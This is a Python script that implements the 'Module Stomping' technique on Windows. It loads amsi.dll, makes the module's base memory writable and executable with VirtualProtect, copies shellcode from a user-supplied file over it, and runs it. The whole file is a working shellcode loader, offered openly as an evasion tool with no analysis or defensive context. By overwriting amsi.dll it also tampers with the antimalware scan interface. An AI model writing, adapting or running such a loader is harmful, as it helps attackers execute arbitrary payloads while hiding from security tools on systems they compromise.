import sys
import ctypes
from ctypes import wintypes

# Define necessary Windows types for 64-bit compatibility to prevent pointer truncation.
wintypes.LPVOID = ctypes.c_void_p
wintypes.HANDLE = ctypes.c_void_p
wintypes.HMODULE = ctypes.c_void_p  # HMODULE is a handle, which is a void* on x64
wintypes.DWORD = ctypes.c_ulong
wintypes.LPDWORD = ctypes.POINTER(wintypes.DWORD)
wintypes.BOOL = ctypes.c_int
wintypes.SIZE_T = ctypes.c_size_t
wintypes.LPCSTR = ctypes.c_char_p # For LoadLibraryA

# Define constants for memory protection
PAGE_EXECUTE_READWRITE = 0x40

# Get a handle to kernel32.dll
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

# Define function prototypes for the Windows APIs we will use.
# This is CRITICAL for 64-bit execution.

# LoadLibraryA
# https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
LoadLibraryA = kernel32.LoadLibraryA
LoadLibraryA.argtypes = [wintypes.LPCSTR]
LoadLibraryA.restype = wintypes.HMODULE

# VirtualProtect
# https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
VirtualProtect = kernel32.VirtualProtect
VirtualProtect.argtypes = [wintypes.LPVOID, wintypes.SIZE_T, wintypes.DWORD, wintypes.LPDWORD]
VirtualProtect.restype = wintypes.BOOL

def main():
    """
    Implements the Module Stomping technique. It loads a legitimate DLL,
    overwrites its entry point in memory with shellcode, and executes it.
    """
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <path_to_shellcode_bin>")
        sys.exit(1)

    shellcode_path = sys.argv[1]
    
    try:
        with open(shellcode_path, 'rb') as f:
            shellcode = f.read()
    except FileNotFoundError:
        print(f"Error: File not found at '{shellcode_path}'")
        sys.exit(1)
    except Exception as e:
        print(f"An error occurred while reading the file: {e}")
        sys.exit(1)

    if not shellcode:
        print("Error: Shellcode file is empty.")
        sys.exit(1)
        
    shellcode_size = len(shellcode)

    # 1. Load a legitimate, non-critical DLL into the process space.
    # The handle returned by LoadLibraryA is the base address of the loaded module.
    dll_name = b"amsi.dll"
    print(f"Loading legitimate module: {dll_name.decode()}")
    h_module = LoadLibraryA(dll_name)

    if not h_module:
        error_code = ctypes.get_last_error()
        print(f"Failed to load {dll_name.decode()}. Error code: {error_code}")
        sys.exit(1)
    
    # The module handle is its base address. Cast to c_void_p for API calls.
    module_base_address = ctypes.c_void_p(h_module)
    print(f"Module '{dll_name.decode()}' loaded at address: 0x{h_module:016X}")

    # 2. Change the memory protection of the module's base address to allow writing.
    old_protect = wintypes.DWORD(0)
    print(f"Changing memory protection for 0x{h_module:016X} to PAGE_EXECUTE_READWRITE")
    
    success = VirtualProtect(
        module_base_address,        # Address to modify (module base)
        shellcode_size,             # Size of the region to change
        PAGE_EXECUTE_READWRITE,     # New protection constant
        ctypes.byref(old_protect)   # Pointer to receive old protection
    )

    if not success:
        error_code = ctypes.get_last_error()
        print(f"Failed to change memory protection. Error code: {error_code}")
        # No need to free library, OS will handle it on process exit.
        sys.exit(1)

    print(f"Memory protection changed. Old protection: {hex(old_protect.value)}")

    # 3. Copy the shellcode to the module's base address, "stomping" the original code.
    print(f"Copying {shellcode_size} bytes of shellcode to 0x{h_module:016X}")
    ctypes.memmove(module_base_address, shellcode, shellcode_size)
    print("Shellcode copied successfully.")

    # 4. Create a function pointer to the shellcode (at the module's base address) and execute it.
    shellcode_func = ctypes.CFUNCTYPE(None)(h_module)
    
    print("Executing shellcode from within the legitimate module's memory...")
    try:
        shellcode_func()
    except Exception as e:
        # This exception is expected if the shellcode exits the thread/process.
        print(f"Shellcode execution finished or raised an exception: {e}")
    
    print("Execution complete.")
    # No cleanup like VirtualFree is needed. The process termination will unload the DLL.

if __name__ == "__main__":
    main()